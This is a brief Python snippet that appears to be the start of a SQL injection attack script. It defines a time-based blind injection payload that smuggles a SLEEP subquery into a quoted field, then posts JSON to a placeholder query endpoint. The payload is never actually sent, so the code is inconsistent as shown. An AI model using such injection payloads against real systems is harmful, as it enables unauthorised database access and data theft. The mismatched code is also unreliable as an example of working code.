import requests
payload = "ban', (SELECT SLEEP(4)), 'x')-- -"

requests.post("https://example.test/query", json={"type": "bank"})
